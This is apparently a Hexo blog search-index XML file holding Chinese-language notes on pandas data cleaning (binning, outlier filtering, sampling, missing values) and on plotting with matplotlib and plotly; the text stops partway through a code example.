<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>数据清洗和绘图入门</title>
      <link href="/2022/10/20/%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%92%8C%E7%BB%98%E5%9B%BE%E5%85%A5%E9%97%A8/"/>
      <url>/2022/10/20/%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%92%8C%E7%BB%98%E5%9B%BE%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="数据清洗和准备"><a href="#数据清洗和准备" class="headerlink" title="数据清洗和准备"></a>数据清洗和准备</h1><h1 id="离散化和分箱"><a href="#离散化和分箱" class="headerlink" title="离散化和分箱"></a>离散化和分箱</h1><ol><li><p>需要切割不同的数据段。pd.cut</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line">bins = [<span class="number">1</span> ,<span class="number">2</span> ,<span class="number">5</span> ,<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">cats = pd.cut(data,bins)</span><br><span class="line"><span class="built_in">print</span>(cats)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示出数据在盒子的哪一段？</span></span><br><span class="line"><span class="built_in">print</span>(cats.codes)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示分类区间</span></span><br><span class="line"><span class="built_in">print</span>(cats.categories)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示数据段</span></span><br><span class="line"><span class="built_in">print</span>(cats.value_counts(cats))</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">[NaN, (1.0, 2.0], (2.0, 5.0], (2.0, 5.0], (2.0, 5.0], (5.0, 8.0], (5.0, 8.0]]</span><br><span class="line">Categories (3, interval[int64, right]): [(1, 2] &lt; (2, 5] &lt; (5, 8]]</span><br><span class="line">[-1  0  1  1  1  2  2]</span><br><span class="line">IntervalIndex([(1, 2], (2, 5], (5, 8]], dtype=&#x27;interval[int64, right]&#x27;)</span><br><span class="line">(1, 2]    1</span><br><span class="line">(2, 5]    3</span><br><span class="line">(5, 8]    2</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure></li><li><p>可以通过qcut获得等长的箱：precision=2的选项将十进制精度限制在两位（指的是分段的时候）</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cut获得等长的</span></span><br><span class="line">data = <span class="built_in">range</span>(<span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(data))</span><br><span class="line">cats = pd.cut(data,<span class="number">3</span>,precision=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(cats)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]</span><br><span class="line">[(-0.0, 6.0], (-0.0, 6.0], (-0.0, 6.0], (-0.0, 6.0], (-0.0, 6.0], ..., (13.0, 19.0], (13.0, 19.0], (13.0, 19.0], (13.0, 19.0], (13.0, 19.0]]</span><br><span class="line">Length: 20</span><br><span class="line">Categories (3, interval[float64, right]): [(-0.0, 6.0] &lt; (6.0, 13.0] &lt; (13.0, 19.0]]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># qcut</span></span><br><span class="line">data = <span class="built_in">range</span>(<span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(data))</span><br><span class="line">cats = pd.qcut(data,<span class="number">3</span>,precision=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(cats)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]</span><br><span class="line">[(-1.0, 6.0], (-1.0, 6.0], (-1.0, 6.0], (-1.0, 6.0], (-1.0, 6.0], ..., (13.0, 19.0], (13.0, 19.0], (13.0, 19.0], (13.0, 19.0], (13.0, 19.0]]</span><br><span class="line">Length: 20</span><br><span class="line">Categories (3, interval[float64, right]): [(-1.0, 6.0] &lt; (6.0, 13.0] &lt; (13.0, 19.0]]</span><br></pre></td></tr></table></figure><h1 id="检测和过滤异常值"><a href="#检测和过滤异常值" class="headerlink" title="检测和过滤异常值"></a>检测和过滤异常值</h1><ol><li><p>灵活使用any和all⽤来过滤bool索引</p><p><code>all和any 仅仅会判断0和非0 True和False</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>),index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"><span class="comment"># s = pd.Series([1, 2, 3, np.nan, None])</span></span><br><span class="line"><span class="comment">#  all和any 仅仅会判断0和1 Ture和false</span></span><br><span class="line"><span class="built_in">print</span>(df.<span class="built_in">all</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   <span class="number">0</span>  <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line">c  <span class="number">8</span>  <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">0</span>    <span class="literal">False</span></span><br><span class="line"><span class="number">1</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">2</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">3</span>     <span class="literal">True</span></span><br><span class="line">dtype: <span class="built_in">bool</span></span><br></pre></td></tr></table></figure><p>all(0)——列</p><p>all(1)——行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame(np.random.randn(<span class="number">1000</span>, <span class="number">4</span>))</span><br><span class="line">col = data[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(col[np.<span class="built_in">abs</span>(col) &gt; <span class="number">3</span>])</span><br><span class="line"><span class="comment">#  要选出所有值⼤于3或⼩于-3的⾏，你可以对布尔值DataFrame使⽤any⽅法：</span></span><br><span class="line"><span class="built_in">print</span>(data[(np.<span class="built_in">abs</span>(data) &gt; <span class="number">3</span>).<span class="built_in">any</span>(<span class="number">1</span>)])：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line"><span class="number">319</span>    <span class="number">3.303295</span></span><br><span class="line"><span class="number">387</span>   -<span class="number">3.085890</span></span><br><span class="line"><span class="number">952</span>   -<span class="number">3.161009</span></span><br><span class="line">Name: <span class="number">2</span>, dtype: float64</span><br><span class="line">        </span><br><span class="line">            <span class="number">0</span>         <span class="number">1</span>         <span class="number">2</span>         <span class="number">3</span></span><br><span class="line"><span class="number">107</span>  <span class="number">3.133777</span>  <span class="number">0.999826</span> -<span class="number">1.131444</span>  <span class="number">0.471213</span></span><br><span class="line"><span class="number">170</span>  <span class="number">3.201041</span>  <span class="number">1.331102</span>  <span class="number">0.841939</span>  <span class="number">2.088766</span></span><br><span class="line"><span class="number">319</span> -<span class="number">0.933900</span>  <span class="number">0.599506</span>  <span class="number">3.303295</span> -<span class="number">3.023445</span></span><br><span class="line"><span class="number">387</span> -<span class="number">0.483502</span> -<span class="number">0.124413</span> -<span class="number">3.085890</span> -<span class="number">0.761549</span></span><br><span class="line"><span class="number">505</span>  <span class="number">0.614210</span>  <span class="number">3.080073</span> -<span class="number">1.627996</span>  <span class="number">1.034018</span></span><br><span class="line"><span class="number">633</span> -<span class="number">3.259740</span> -<span class="number">1.494244</span> -<span class="number">0.111966</span> -<span class="number">0.359650</span></span><br><span class="line"><span class="number">771</span>  <span class="number">0.785776</span> -<span class="number">3.610443</span>  <span class="number">1.239399</span>  <span class="number">1.128048</span></span><br><span class="line"><span class="number">801</span>  <span class="number">1.547612</span>  <span class="number">3.039402</span>  <span class="number">0.102769</span> -<span class="number">2.795720</span></span><br><span class="line"><span class="number">853</span>  <span class="number">0.522063</span>  <span class="number">0.167094</span> -<span class="number">0.329888</span>  <span class="number">3.255779</span></span><br><span class="line"><span class="number">923</span> -<span class="number">0.251616</span>  <span class="number">0.193057</span>  <span class="number">0.476540</span> -<span class="number">3.004369</span></span><br><span class="line"><span class="number">952</span>  <span class="number">1.507127</span> -<span class="number">0.667296</span> -<span class="number">3.161009</span> -<span class="number">1.330215</span></span><br></pre></td></tr></table></figure><h1 id="置换和随机抽样"><a href="#置换和随机抽样" class="headerlink" title="置换和随机抽样"></a>置换和随机抽样</h1><ol><li><p>​    要随机提取的样本可以⽤sample函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>),index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment">#随机取3⾏</span></span><br><span class="line"><span class="built_in">print</span>(df.sample(<span class="number">3</span>)) <span class="comment"># df.sample(n=3)是一样的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#允许放回</span></span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>),index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"><span class="built_in">print</span>(df.sample(n=<span class="number">10</span>,replace=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   <span class="number">0</span>  <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line">c  <span class="number">8</span>  <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line">   <span class="number">0</span>  <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line">c  <span class="number">8</span>  <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line">c  <span class="number">8</span>  <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line">a  <span class="number">0</span>  <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line">b  <span class="number">4</span>  <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br></pre></td></tr></table></figure><h1 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h1><h2 id="字符串对象方法"><a href="#字符串对象方法" class="headerlink" title="字符串对象方法"></a>字符串对象方法</h2><ol><li>split、strip</li><li>find、index   find是返回-1,index会抛出异常</li><li>count、replace</li><li>lower、upper</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># split分割 strip除去</span></span><br><span class="line">s = <span class="string">&#x27;a ,b ,xx &#x27;</span></span><br><span class="line">p = [ x.strip().upper() <span class="keyword">for</span> x <span class="keyword">in</span> s.split(<span class="string">&#x27;,&#x27;</span>) ]</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.find(<span class="string">&#x27;a&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.count(<span class="string">&#x27;x&#x27;</span>)) <span class="comment"># 计数</span></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;XX&#x27;</span>]</span><br><span class="line">found</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="Pandas中的向量化字符串函数"><a href="#Pandas中的向量化字符串函数" class="headerlink" title="Pandas中的向量化字符串函数"></a>Pandas中的向量化字符串函数</h2><p>你可以使⽤data.map将字符串和有效的正则表达式方法（以 lambda或其他函数的⽅式传递）应⽤ 到每个值上，但是在 NA（null）值上会失败。为了解决这个问题，Series有面向数组 的⽅法⽤于跳 过NA值的字符串操作。这些方法通过Series的str 属性进行调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我们可以通过str.contains来检查每个电⼦ 邮件地址是否含有&#x27;gmail&#x27;：</span></span><br><span class="line">data.<span class="built_in">str</span>.contains(<span class="string">&#x27;gmail&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol></li></ol><h1 id="绘图和可视化"><a href="#绘图和可视化" class="headerlink" title="绘图和可视化"></a>绘图和可视化</h1><h2 id="安装matplotlib"><a href="#安装matplotlib" class="headerlink" title="安装matplotlib"></a>安装matplotlib</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install matplotlib --target=D:\My_Code\class_python\venv\Lib\site-packages </span><br></pre></td></tr></table></figure><h2 id="matplotloib-API入门"><a href="#matplotloib-API入门" class="headerlink" title="matplotloib API入门"></a>matplotloib API入门</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = np.array([<span class="number">1</span>,<span class="number">20</span>,<span class="number">1</span>])</span><br><span class="line">plt.plot(data)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20221020170847443.png" alt="image-20221020170847443"></p><h2 id="使用pandas和seaborn绘图"><a href="#使用pandas和seaborn绘图" class="headerlink" title="使用pandas和seaborn绘图"></a>使用pandas和seaborn绘图</h2><p><a href="https://seaborn.pydata.org/">seaborn: statistical data visualization — seaborn 0.12.1 documentation (pydata.org)</a></p><p><a href="https://plotly.com/python/">https://plotly.com/python/</a></p><ul><li>尝试使用plotly</li></ul><ol><li>安装</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install plotly --target=D:\My_Code\class_python\venv\Lib\site-packages </span><br></pre></td></tr></table></figure><ol start="2"><li>使用一个简单构图<a href="https://plotly.com/python/figure-structure/#overview">https://plotly.com/python/figure-structure/#overview</a></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> plotly.express <span class="keyword">as</span> px</span><br><span class="line"></span><br><span class="line">fig = px.line(x=[<span class="string">&quot;原点&quot;</span>,<span class="string">&quot;峰值&quot;</span>,<span class="string">&quot;最后&quot;</span>], y=[<span class="number">0</span>,<span class="number">99</span>,<span class="number">50</span>], title=<span class="string">&quot;sample figure&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(fig)</span><br><span class="line">fig.show()</span><br></pre></td></tr></table></figure><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20221020172405020.png" alt="image-20221020172405020"></p>]]></content>
      
      
      <categories>
          
          <category> python数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据清洗与准备</title>
      <link href="/2022/10/18/%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E4%B8%8E%E5%87%86%E5%A4%87/"/>
      <url>/2022/10/18/%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E4%B8%8E%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h1 id="数据清洗与准备"><a href="#数据清洗与准备" class="headerlink" title="数据清洗与准备"></a>数据清洗与准备</h1><h1 id="处理缺失值"><a href="#处理缺失值" class="headerlink" title="处理缺失值"></a>处理缺失值</h1><ol><li><p>对于数值型数据，pandas使⽤浮点值 NaN（Not a Number来表示缺失值）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string_data = pd.Series([<span class="string">&#x27;aardvark&#x27;</span>, <span class="string">&#x27;artichoke&#x27;</span>, np.nan, <span class="string">&#x27;avocado&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(string_data.isnull())</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line"><span class="number">0</span>    <span class="literal">False</span></span><br><span class="line"><span class="number">1</span>    <span class="literal">False</span></span><br><span class="line"><span class="number">2</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">3</span>    <span class="literal">False</span></span><br><span class="line">dtype: <span class="built_in">bool</span></span><br></pre></td></tr></table></figure></li><li><p>Python内建的None值在对象数组中也被当作NA处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">string_data = pd.Series([<span class="string">&#x27;aardvark&#x27;</span>, <span class="string">&#x27;artichoke&#x27;</span>, np.nan, <span class="string">&#x27;avocado&#x27;</span>])</span><br><span class="line">string_data[<span class="number">0</span>] = <span class="literal">None</span></span><br><span class="line"><span class="built_in">print</span>(string_data.isnull())</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line"><span class="number">0</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">1</span>    <span class="literal">False</span></span><br><span class="line"><span class="number">2</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">3</span>    <span class="literal">False</span></span><br><span class="line">dtype: <span class="built_in">bool</span></span><br></pre></td></tr></table></figure></li><li><p>NA处理方法</p><ul><li><p>dropna 丢掉NA值 </p></li><li><p>fillna 填充NA值，分为ffill 或者 bfill </p></li><li><p>isnull 判断哪些是na </p></li><li><p>notnull isnull的取反</p></li></ul><h1 id="过滤缺失值"><a href="#过滤缺失值" class="headerlink" title="过滤缺失值"></a>过滤缺失值</h1><p>你可以使用pandas.isnull和布尔值索引手动地过滤缺失值，但dropna在过滤缺失值时是非常有用的。在Series上使⽤dropna，它会返回Series中所有的非空数据及其索引值。当处理DataFrame对象时，dropna默认情况下会删除包含缺失值的行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.arange(<span class="number">9</span>).reshape((<span class="number">3</span>, <span class="number">3</span>)),</span><br><span class="line">                     index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">                     columns=[<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;California&#x27;</span>])</span><br><span class="line"></span><br><span class="line">frame.loc[<span class="string">&#x27;a&#x27;</span>,[<span class="string">&#x27;Texas&#x27;</span>]] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 传⼊how=&#x27;all&#x27;时，将删除所有值均为NA的⾏</span></span><br><span class="line"><span class="comment"># 如果要⽤同样的⽅式去删除列，传⼊参数axis=1</span></span><br><span class="line"><span class="comment"># thresh=n是指：保留下来的每⼀⾏，其⾮NA的数⽬&gt;=n</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(frame.dropna())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 在dataframe中会删除行 可以用axis=<span class="number">1</span>删除列</span><br><span class="line">   Ohio  Texas  California</span><br><span class="line">b     <span class="number">3</span>    <span class="number">4.0</span>           <span class="number">5</span></span><br><span class="line">c     <span class="number">6</span>    <span class="number">7.0</span>           <span class="number">8</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="补全缺失值"><a href="#补全缺失值" class="headerlink" title="补全缺失值"></a>补全缺失值</h1><ol><li><p>主要使用fillna方法来补全缺失值。调用fillna时，可以使用⼀个常数来替代缺失值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">frame = pd.DataFrame(np.arange(<span class="number">9</span>).reshape((<span class="number">3</span>, <span class="number">3</span>)),</span><br><span class="line">                     index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">                     columns=[<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;California&#x27;</span>])</span><br><span class="line"></span><br><span class="line">frame.loc[<span class="string">&#x27;a&#x27;</span>,[<span class="string">&#x27;Texas&#x27;</span>]] = <span class="literal">None</span></span><br><span class="line"><span class="built_in">print</span>(frame.fillna(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   Ohio  Texas  California</span><br><span class="line">a     <span class="number">0</span>    <span class="number">0.0</span>           <span class="number">2</span></span><br><span class="line">b     <span class="number">3</span>    <span class="number">4.0</span>           <span class="number">5</span></span><br><span class="line">c     <span class="number">6</span>    <span class="number">7.0</span>           <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在调⽤fillna时使⽤字典，你可以为不同列设定不同的填充值 注意这里是列</span></span><br><span class="line">frame = pd.DataFrame(np.arange(<span class="number">9</span>).reshape((<span class="number">3</span>, <span class="number">3</span>)),</span><br><span class="line">                     index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">                     columns=[<span class="string">&#x27;Ohio&#x27;</span>, <span class="string">&#x27;Texas&#x27;</span>, <span class="string">&#x27;California&#x27;</span>])</span><br><span class="line"></span><br><span class="line">frame.loc[<span class="string">&#x27;a&#x27;</span>,[<span class="string">&#x27;Texas&#x27;</span>]] = <span class="literal">None</span></span><br><span class="line"><span class="comment"># print(frame.fillna(0))</span></span><br><span class="line"><span class="built_in">print</span>(frame.fillna(&#123;<span class="string">&#x27;Texas&#x27;</span>:<span class="number">0.5</span>&#125;))</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   Ohio  Texas  California</span><br><span class="line">a     <span class="number">0</span>    <span class="number">0.5</span>           <span class="number">2</span></span><br><span class="line">b     <span class="number">3</span>    <span class="number">4.0</span>           <span class="number">5</span></span><br><span class="line">c     <span class="number">6</span>    <span class="number">7.0</span>           <span class="number">8</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>fillna 函数参数总结<br>value : 用值或者字典填充<br>method : ffill bfill<br>axis : 默认axis = 0<br>limit : 向前或者向后填充时的最⼤填充范围</p></li></ol><h1 id="删除重复值"><a href="#删除重复值" class="headerlink" title="删除重复值"></a>删除重复值</h1><ol><li> data.duplicated()： DataFrame的duplicated方法返回的是⼀个布尔值Series，这个Series反映的 是每⼀行是否存在重复。</li></ol>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 